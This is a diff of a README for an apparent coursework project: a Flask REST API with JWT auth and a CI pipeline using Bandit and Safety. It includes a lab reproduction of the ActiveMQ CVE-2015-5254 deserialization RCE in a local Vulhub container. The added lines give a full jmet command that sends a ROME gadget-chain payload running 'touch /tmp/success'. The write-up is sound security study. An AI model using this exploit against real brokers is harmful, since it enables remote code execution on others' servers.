@@ -10,8 +10,10 @@ This project is a secure REST API built using Python (Flask). It utilizes SQLite
 
 *   `POST /auth/login`: Accepts a JSON body with `username` and `password`. Upon successful authentication, it returns a JWT token.
 <img width="415" height="221" alt="image" src="https://github.com/user-attachments/assets/fec53e90-a40a-4377-9e3c-025d4c094ba4" />
+
 *   `GET /api/data`: A protected endpoint that returns a list of mock data. Requires a valid JWT in the `Authorization: Bearer <token>` header.
 <img width="415" height="222" alt="image" src="https://github.com/user-attachments/assets/14372777-2232-421e-875a-9f827aca9769" />
+
 *   `POST /api/register`: A supplementary endpoint to register a new user. Passwords are securely hashed before storage.
 <img width="415" height="223" alt="image" src="https://github.com/user-attachments/assets/5700a738-d3e0-481a-8e2f-752c54e3ea97" />
 
@@ -32,7 +34,7 @@ When returning user data, we ensure it is sanitized. While Flask returns JSON by
 ---
 
 ## 3. CI/CD Pipeline and Security Scanners (SAST/SCA)
-The CI/CD pipeline is configured using **GitHub Actions** (`.github/workflows/security.yml`). It triggers automatically on every push or pull request to the `main` branch.
+The CI/CD pipeline is configured using **GitHub Actions** `.github/workflows/security.yml`. It triggers automatically on every push or pull request to the `main` branch.
 
 *   **SAST (Static Application Security Testing):** We use **Bandit** to scan the Python source code for common security issues (e.g., hardcoded secrets, use of unsafe functions).
 *   **SCA (Software Composition Analysis):** We use **Safety** to check `requirements.txt` and installed dependencies against a database of known vulnerabilities.
@@ -40,7 +42,7 @@ The CI/CD pipeline is configured using **GitHub Actions** (`.github/workflows/se
 ### Screenshots of SAST/SCA Reports
 <img width="414" height="201" alt="image" src="https://github.com/user-attachments/assets/a4b1aa44-8640-4b3e-8410-020cf9fad707" />
 
-*(Link to the successful pipeline run: 【在此处填入你 GitHub Actions 运行的网页链接】)*
+https://github.com/atalia049/secure-api/actions/runs/39219332043
 
 ---
 
@@ -52,18 +54,19 @@ The CI/CD pipeline is configured using **GitHub Actions** (`.github/workflows/se
 *   **Description:** This is a critical Remote Code Execution (RCE) vulnerability caused by insecure deserialization. ActiveMQ versions prior to 5.13.0 do not restrict classes that can be deserialized, allowing attackers to send malicious serialized `ObjectMessage` payloads to execute arbitrary code on the server.
 
 ### 4.2 Reproduction Steps
-The vulnerable environment was launched using Vulhub (`vulhub/activemq/CVE-2015-5254`) with version `5.11.1`. The `jmet` tool was used to generate the payload.
+The vulnerable environment was launched using Vulhub `vulhub/activemq/CVE-2015-5254` with version `5.11.1`. The `jmet` tool was used to generate the payload.
 
 **Step 1: Send the malicious payload**
-We sent a payload to execute `touch /tmp/success` via the ROME gadget chain to the ActiveMQ broker port (mapped to 16161).
+We used the `jmet` tool with the `ROME` gadget chain to send a payload that executes the `touch /tmp/success` command. Because the system uses a higher Java version, `--add-opens` parameters are required to allow reflection.
+`java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 127.0.0.1 16161`
 
-java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 127.0.0.1 16161
+<img width="415" height="168" alt="image" src="https://github.com/user-attachments/assets/3563c44d-b7e1-4900-aedd-a993a3b74eca" />
 
-【在此处插入 jmet 终端发送成功 (带绿字) 的截图】
 
 Step 2: Trigger the vulnerability
 Navigated to the ActiveMQ Web Console (http://127.0.0.1:8161/admin/), clicked on the event queue, and clicked on the Message ID to trigger deserialization.
-【在此处插入 网页端显示 Message ID 列表或者报错 Forbidden class 的截图】
+<img width="415" height="201" alt="image" src="https://github.com/user-attachments/assets/49abd179-81a6-4c85-aab5-355658051814" />
+
 
 Step 3: Verify Exploitation
 Entered the running container and checked for the file created by the command.
